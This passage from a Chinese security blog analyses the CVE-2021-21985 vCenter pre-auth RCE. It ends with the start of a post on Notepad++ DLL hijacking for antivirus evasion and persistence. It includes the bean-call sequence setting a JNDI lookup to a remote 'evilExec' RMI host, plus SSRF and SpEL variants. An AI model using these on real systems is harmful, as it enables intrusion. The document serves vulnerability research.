title="漏洞分析"></a>漏洞分析</h3><p>从官方通告能够猜到漏洞入口是vsan插件的未授权访问，为了减少干扰代码的影响，我们对漏洞修复前后的两个版本（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）进行对比分析。</p><p>挂载或解压对应ISO，将<code>VMware VCSA/vcsa</code>路径下的OVA文件导入虚拟机，由CUI开启ssh服务便于后续操作。</p><p><img src="/img/vcenterldfx_g.png"></p><p>用root帐号ssh连上vCenter，定位到vsan-h5-client插件再通过python httpserver下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -name &#x27;*vsan*&#x27; | grep &#x27;h5&#x27;</span></span><br><span class="line">/usr/lib/vmware-vpx/vsan-health/ui-plugins/vsan-h5-client.zip</span><br><span class="line"></span><br><span class="line">python3 -m http.server -d /usr/lib/vmware-vpx/vsan-health/ui-plugins/ 8010</span><br></pre></td></tr></table></figure><p>不是我不知道scp这个东西，photon linux的特殊结构导致了没法直接用scp传输文件：</p><p><img src="/img/vcenterldfx_h.png"></p><p>至于为什么用8010端口，是因为严格的iptables规则中这个端口在白名单里而且没被占用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iptables -L</span></span><br><span class="line">Chain INPUT (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line">DROP       all  --  anywhere             anywhere             ctstate INVALID</span><br><span class="line">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span><br><span class="line">inbound    all  --  anywhere             anywhere            </span><br><span class="line">port_filter  all  --  anywhere             anywhere            </span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-request</span><br><span class="line">DROP       icmp --  anywhere             anywhere             icmp timestamp-reply</span><br><span class="line">ACCEPT     icmp --  anywhere             anywhere            </span><br><span class="line">DROP       udplite--  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line"></span><br><span class="line">Chain inbound (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">RETURN     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain port_filter (1 references)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tungsten-https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ideafarm-door</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldap</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ldaps</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:tmosms0</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:xinupageserver</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:troff</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:shell</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:syslog</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:fujitsu-dtcns</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:5480</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:kerberos</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:kerberos</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ttyinfo</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:8010</span><br></pre></td></tr></table></figure><p>分别将两个版本的压缩包下载下来解压，IDEA对比h5-vsan-context.jar，看到新版本中对<code>/rest/*</code>路径添加了<code>authenticationFilter</code>过滤器。</p><p><img src="/img/vcenterldfx_i.png"></p><p>具体类实现中拦截了未登录的请求，并返回401状态码：</p><p><img src="/img/vcenterldfx_j.png"></p><p>另一处变动是h5-vsan-service.jar中ProxygenController类的invokeService方法，通过isAnnotationPresent判断只有方法存在<code>TsService</code>接口才会反射调用，感觉就是设置方法白名单了。</p><p><img src="/img/vcenterldfx_k.png"></p><p>invokeService方法会被<code>invokeServiceWithJson</code>或<code>invokeServiceWithMultipartFormData</code>调用，两个方法都是从URL路径中取<code>beanIdOrClassName</code>和<code>methodName</code>的值、从HTTP请求体中取<code>methodInput</code>的值，并经过格式化处理后作为入参传给invokeService方法。</p><p><img src="/img/vcenterldfx_l.png"></p><p>invokeService方法反射获取类进而注入bean，反射获取所有public方法并遍历，通过ProxygenSerializer类的deserializeMethodInput转化为方法对象后反射调用。（6.7不同小版本的代码有细微差异）</p><p><img src="/img/vcenterldfx_m.png"></p><p>由21982的分析已经知道vCenter会由rhttpproxy反代复用端口，通过<code>META-INF/MANIFEST.MF</code>和<code>web.xml</code>可以知道vsan插件部署的Web路径为<code>ui/h5-vsan/rest/*</code>，再结合各级的RequestMapping路由映射注解，推出漏洞入口就是通过<code>https://1.1.1.1/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;</code>触发环境中类危险方法调用。有TP5的RCE那味了，但并不可以用Runtime.exec直接莽，因为getBean时只会在<code>beanMap</code>中查找，动态调试可以看到内存中加载的Map：</p><p><img src="/img/vcenterldfx_n.png"></p><ul><li>在<code>/etc/vmware/vmware-vmon/svcCfgfiles/vsphere-ui.json</code>中添加启动参数<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8010</code>后执行<code>service-control --restart vsphere-ui</code>重启服务，IDEA中添加<code>Remote JVM Debug</code>配置<code>Attach to remote JVM</code>模式远程调试，如果不是用8010端口得开一下防火墙：<code>iptables -P INPUT ACCEPT</code></li></ul><p>所以接下来就是在一堆bean里查找危险方法构建利用链了，在<code>vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml</code>配置文件中找到它们的定义，所有scope都是缺省的<code>singleton</code>而且没有配置<code>lazy-init</code>，也就是说这些bean都会在spring项目启动时单例加载。</p><p><img src="/img/vcenterldfx_o.png"></p><p>看到<code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code>方法和它的继承链，在<a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html">官方API文档</a>可以清晰地看到其继承自父类MethodInvoker的多个方法：</p><p><img src="/img/vcenterldfx_p.png"></p><p>invoke方法源码如下，由<code>targetObject</code>、<code>preparedMethod</code>调用静态方法，<code>ReflectionUtils.makeAccessible</code>修改方法可见性，<code>getArguments</code>获取参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line"><span class="comment">// In the static case, target will simply be &#123;@code null&#125;.</span></span><br><span class="line">Object targetObject = getTargetObject();</span><br><span class="line">Method preparedMethod = getPreparedMethod();</span><br><span class="line"><span class="keyword">if</span> (targetObject == <span class="keyword">null</span> &amp;&amp; !Modifier.isStatic(preparedMethod.getModifiers())) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Target method must not be non-static without a target&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ReflectionUtils.makeAccessible(preparedMethod);</span><br><span class="line"><span class="keyword">return</span> preparedMethod.invoke(targetObject, getArguments());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用静态方法并不需要<code>targetObject</code>，通过<code>setTargetObject</code>将其设置为null。<code>getArguments</code>取的就是<code>arguments</code>的值，可以通过<code>setArguments</code>将其设置为Obejct[]的JNDI远程方法（RMI/LDAP）。向上跟进<code>preparedMethod</code>可以看到如下反向调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preparedMethod</span><br><span class="line">    <span class="keyword">this</span>.methodObject</span><br><span class="line">        targetClass.getMethod(targetMethod, argTypes)</span><br><span class="line">            resolveClassName(className)</span><br><span class="line">                String className = <span class="keyword">this</span>.staticMethod.substring(<span class="number">0</span>, lastDotIndex)</span><br><span class="line">                String methodName = <span class="keyword">this</span>.staticMethod.substring(lastDotIndex + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>至此这条利用链的入口和链尾已经成型：<code>&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象</code>，搜索配置文件中class为<code>MethodInvokingFactoryBean</code>的bean就可以找到能作为连接链两端的部分：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vsanProviderUtils_setVmodlHelper</span><br><span class="line">vsanProviderUtils_setVsanServiceFactory</span><br><span class="line">vsanQueryUtil_setDataService</span><br><span class="line">vsanCapabilityUtils_setVsanCapabilityCacheManager</span><br><span class="line">vsanUtils_setMessageBundle</span><br><span class="line">vsanFormatUtils_setUserSessionService</span><br><span class="line">vsphereHealthProviderUtils_setVsphereHealthServiceFactory</span><br></pre></td></tr></table></figure><ul><li>bean配置中没写id时，name属性可以起到类似的作用</li></ul><p>直接调用FactoryBean实际上是其getObject方法返回的对象，而我们需要的是<code>MethodInvokingFactoryBean</code>自身，因此在调用这些bean时要在前面加上<code>&amp;</code>。利用bean饿汉式单例的特性，可以通过POST请求依次调用各个set方法赋值构造利用链：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;&#123;beanName&#125;/setTargetObject</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="literal">null</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setStaticMethod</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[<span class="string">&quot;javax.naming.InitialContext.doLookup&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/setArguments</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[[<span class="string">&quot;rmi://1.1.1.1:1099/evilExec&quot;</span>]]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/prepare</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br><span class="line"></span><br><span class="line">&amp;&#123;beanName&#125;/invoke</span><br><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>:[]&#125;</span><br></pre></td></tr></table></figure><p>但。。。是。。。随着vCenter版本的不断更新，其photon linux搭载的jdk版本也在不断更新，6.7初始版本的8u71可以直接打，中间更高些jdk版本可能就需要打rmi bypass或者ldap，到漏洞修复前一个小版本jdk已经是8u281了，按照刚从火星回来的我肤浅的了解，目前似乎还没有公开的byapss 8u241+的方法（这里不是太确定，说错了欢迎拍砖）</p><p>而且vCenter通常部署在内网深处，不一定有那么好的出网环境加载恶意方法。回顾来看目前具有调用任意类任意静态方法的能力，被反向移植的jfr包的静态方法writeGeneratedASM中存在FileOutputStream，通过java.lang.System.setProperty静态方法将<code>SAVE_GENERATED</code>设置为true，这样就能将字节数组写入指定位置的以<code>.class</code>结尾的文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeGeneratedASM</span><span class="params">(String className, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We can&#x27;t calculate value statically because it will force</span></span><br><span class="line">        <span class="comment">// initialization of SecuritySupport, which cause</span></span><br><span class="line">        <span class="comment">// UnsatisfiedLinkedError on JDK 8 or non-Oracle JDKs</span></span><br><span class="line">        SAVE_GENERATED = SecuritySupport.getBooleanProperty(<span class="string">&quot;jfr.save.generated.asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (SAVE_GENERATED) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> (FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(className + <span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                fos.write(bytes);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> (FileWriter fw = <span class="keyword">new</span> FileWriter(className + <span class="string">&quot;.asm&quot;</span>); PrintWriter pw = <span class="keyword">new</span> PrintWriter(fw)) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">                CheckClassAdapter.verify(cr, <span class="keyword">true</span>, pw);</span><br><span class="line">            &#125;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Instrumented code saved to &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Logger.log(LogTag.JFR_SYSTEM_BYTECODE, LogLevel.INFO, <span class="string">&quot;Could not save instrumented code, for &quot;</span> + className + <span class="string">&quot;.class and .asm&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但输入参数都会被ProxygenSerializer类的deserializeMethodInput方法格式化成<code>Object[]</code>，要怎么得到<code>byte[]</code>类型的参数呢。巧的是当<code>prepare</code>时<code>argTypes</code>类型不正确导致的异常，会经由以下调用栈并最终转化为需要的byte数组Orz：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.findMatchingMethod</span><br><span class="line">org.springframework.beans.support.ArgumentConvertingMethodInvoker.doFindMatchingMethod</span><br><span class="line">TypeConverter.convertIfNecessary</span><br></pre></td></tr></table></figure><p>再利用tomcat中的静态方法<a href="https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/manager/ManagerServlet.html#copyInternal-java.io.File-java.io.File-byte:A-">copyInternal</a>即可实现对写入的<code>.class</code>文件的拷贝和重命名。没有能未授权访问且解析jsp的地方时，可以利用JNI机制由System.load加载native方法调用上传的恶意so，不过如果目标不出网也不好解决命令回显的问题。</p><p>对此漏洞作者（rr yyds）利用<code>vmodlContext</code>这个bean对应类<code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code>（vropsplugin-service.jar）的<code>loadVmodlPackage</code>方法，会经由NonValidatingClassPathXmlApplicationContext调用父类ClassPathXmlApplicationContext的构造方法从我们可控的<code>vmodPackage</code>加载，该Spring类构造方法支持远程加载解析xml中的SpEL表达式执行命令。</p><p><img src="/img/vcenterldfx_s.png"></p><p><code>vmodPackage</code>参数传递过程中通过<code>getContextFileNameForPackage</code>加载<code>/context.xml</code>，并通过其重载方法将<code>.</code>替换为<code>/</code>，xml内容中不能用标准IP和域名，可以用十进制型IP绕过。但这样依然是反向远程加载xml文件，不出网的环境就会很蛋疼，所以现在要解决的问题是如何通过正向访问将恶意xml送进去。可以想到通过<a href="https://en.wikipedia.org/wiki/Data_URI_scheme">data协议</a>传入base64编码的xml数据，可是Java的URL类默认只支持http、https、file、jar。</p><p><img src="/img/vcenterldfx_q.png"></p><p>Java不行！Python行！位于<code>/usr/lib/vmware-vpx/vsan-health/pyMoVsan/</code>的<code>VsanHttpProvider.py</code>存在一个未授权访问SSRF，匹配<code>vsanHealth/vum/driverOfflineBundle/</code>的请求内容，由urlopen发包并zip解压匹配返回<code>*offline_bundle.*</code>文件内容。<code>/etc/hosts</code>的存在也能帮助绕过<code>.</code>的限制，算是锦上添花了。</p><p><img src="/img/vcenterldfx_r.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/hosts</span></span><br><span class="line"><span class="comment"># Begin /etc/hosts (network card version)</span></span><br><span class="line"></span><br><span class="line">127.0.0.1   localhost.localdomain</span><br><span class="line">127.0.0.1localhost</span><br><span class="line">127.0.0.1photon-machine</span><br><span class="line"><span class="comment"># End /etc/hosts (network card version)</span></span><br></pre></td></tr></table></figure><p>现在就只剩下最后一个问题就是如何拿到命令执行的回显，rr的解决方案是发现可以调用到<code>systemProperties</code>的<code>getProperty</code>方法拿到属性，所以执行命令时只需将结果由<code>system.setProperty</code>存入再读出。也可以利用方法执行时的报错将执行结果带出。</p><ul><li>System类有一个本质为Hashtable的Properties类型的props静态成员变量，单个JVM实例共享，不同JVM实例隔离</li></ul><p>总结一下该漏洞可以调用环境中任意类静态方法，比较直接的就是通过JNDI加载远程恶意方法，进一步能够写入和重命名任意文件通过JNI加载so中的native方法，也可以利用Java中的SSRF套娃Python的SSRF实现SpEL注入RCE。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://vdc-download.vmware.com/vmwb-repository/dcr-public/f7ffd9f7-9f92-444c-9529-40913be95870/e6f15e3b-361a-4dac-83e8-d0a4e8b83d0b/vsphere-client-sdk-671-local-programming-guide.pdf">Creating and Deploying Plug-In Packages</a></p><p><a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html">Spring Framework Documentation</a></p><p><a href="https://twitter.com/ptswarm/status/1316016337550938122">File Read</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0002.html">VMSA-2021-0002</a></p><p><a href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p><p><a href="https://0x20h.com/p/7cb6.html">CVE-2021-21972 复现和分析</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0010.html">VMSA-2021-0010</a></p><p><a href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a></p><p><a href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5">A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE</a></p><p><a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">VCSA 6.5-7.0 远程代码执行 CVE-2021-21985 漏洞分析</a></p><p><a href="https://cangqingzhe.github.io/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Vcenter漏洞分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;vSphere Client分为UI层、Java服务层、后端层，前端通过RESTful API与基于Spring MVC和O</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="esxi" scheme="https://hosch3n.github.io/tags/esxi/"/>
    
    <category term="vcsa" scheme="https://hosch3n.github.io/tags/vcsa/"/>
    
    <category term="CVE-2021-21972" scheme="https://hosch3n.github.io/tags/CVE-2021-21972/"/>
    
    <category term="CVE-2021-21985" scheme="https://hosch3n.github.io/tags/CVE-2021-21985/"/>
    
  </entry>
  
  <entry>
    <title>利用dll劫持实现免杀与维权</title>
    <link href="https://hosch3n.github.io/2021/06/29/%E5%88%A9%E7%94%A8dll%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%B4%E6%9D%83/"/>
    <id>https://hosch3n.github.io/2021/06/29/%E5%88%A9%E7%94%A8dll%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%B4%E6%9D%83/</id>
    <published>2021-06-29T08:29:02.000Z</published>
    <updated>2021-07-01T13:17:57.881Z</updated>
    
    <content type="html"><![CDATA[<p>根据软件工程高内聚低耦合的思想，把程序要重复使用的代码封装成函数/类方法，将软件要重复使用的程序封装成链接库。库分为静态链接库和动态链接库，静态链接库顾名思义就是在程序链接阶段打包进文件中，而动态链接库则是在程序运行时再导入调用。动态链接库有着加载时复用节省内存、补丁更新时可符合开闭原则等优点，也有容易发生版本冲突、容易被劫持等缺点。Windows平台下的动态链接库常为dll文件，linux则常为so文件。</p><h2 id="dll劫持概念与类型"><a href="#dll劫持概念与类型" class="headerlink" title="dll劫持概念与类型"></a>dll劫持概念与类型</h2><p>dll劫持就是要想方设法地调用到恶意dll。为了便于理解，需要了解一下目前Windows默认的dll调用顺序：</p><p><img src="/img/lydllhj_a.png"></p><ul><li><em><code>Known DLL</code></em> 特指 定义在<code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>中且只能在System目录中加载的dll们</li></ul><p>由此可以引出几种dll劫持的形式：</p><ol><li><p>直接将恶意dll暴力替换掉正常dll，软件正常功能会受影响</p></li><li><p>将恶意dll作为中间人，转发调用正常dll的导出函数，同时加入额外的恶意操作</p></li><li><p>利用加载顺序的机制，让恶意dll先于正常dll加载</p></li><li><p>利用软件本身缺失的dll加载恶意dll</p></li><li><p>更改环境变量或是.exe.manifest/.exe.local文件实现dll重定向</p></li></ol><ul><li>如果利用低权限劫持的dll文件，会被高权限程序加载运行，就是一个权限提升漏洞</li></ul><h2 id="找dll劫持的一种方法"><a href="#找dll劫持的一种方法" class="headerlink" title="找dll劫持的一种方法"></a>找dll劫持的一种方法</h2><p>通过 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> 监控dll调用是一种最基础的寻找dll劫持的方式，在filter中添加<code>Path ends with .dll</code>和<code>Result is NAME NOT FOUND</code>规则，并且可以加上<code>Process Name contains xxx</code>来针对性的找xxx的dll劫持。</p><p><img src="/img/lydllhj_b.png"></p><p>编写一个加载dll的demo，让它加载一个不存在的dll，可以监控到加载的路径顺序（请无视中文路径乱码Orz）。如果这是一个真实的常用软件，则可以用来实现上文中的第4种劫持。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = LoadLibrary(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Load Success\n&quot;</span>);</span><br><span class="line">        FreeLibrary(hModule);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Load Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/lydllhj_c.png"></p><h2 id="劫持notepad-的dll"><a href="#劫持notepad-的dll" class="headerlink" title="劫持notepad++的dll"></a>劫持notepad++的dll</h2><p>下面以notepad++为例，实现上文中的第2种劫持，这类dll转发利用<code>#pragma comment(linker, &quot;/EXPORT:xxx,@y)</code>可以很方便地实现。</p><p>出于免杀上线以及权限维持的考虑，我们物色一下尽量符合这些特点的dll：</p><ol><li><p>后台进程稳定不挂，避免主进程退出导致dll一起挂了</p></li><li><p>容易触发上线，行为隐蔽不易被杀软和人工发现</p></li></ol><p>然后我看到了会被 <code>updater/GUP.exe</code> 拉起的 <code>libcurl.dll</code>，以及安装版中存在且可方便地附加到绿色版中的 <code>NppShell_06.dll</code>。前者是一个软件更新组件，后者是Windows右键中<code>Edit with Notepad++</code>的组件，会随explorer.exe加载且不会重复执行，只要在文件上按右键就会触发（并不需要点击它，看到时就已经加载了dll）：</p><p><img src="/img/lydllhj_d.png"></p><p>由于 <code>GUP.exe</code> 容易退出，需要让它加到常驻服务里去，我们优先看看 <code>NppShell_06.dll</code>。这是一个会随安装包的<code>Context Menu Enty</code>选项一起安装到软件目录的dll，通过 Process Monitor 监控并筛选注册表，发现有如下变动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;]</span><br><span class="line">@&#x3D;&quot;ANotepad++64&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;\InprocServer32]</span><br><span class="line">@&#x3D;&quot;C:\\Program Files\\Notepad++\\NppShell_06.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;&#x3D;&quot;Apartment&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\CLSID\&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;\Settings]</span><br><span class="line">&quot;Title&quot;&#x3D;&quot;Edit with &amp;Notepad++&quot;</span><br><span class="line">&quot;Path&quot;&#x3D;&quot;C:\\Program Files\\Notepad++\\notepad++.exe&quot;</span><br><span class="line">&quot;Custom&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ShowIcon&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;Dynamic&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;Maxtext&quot;&#x3D;dword:00000019</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers\ANotepad++64]</span><br><span 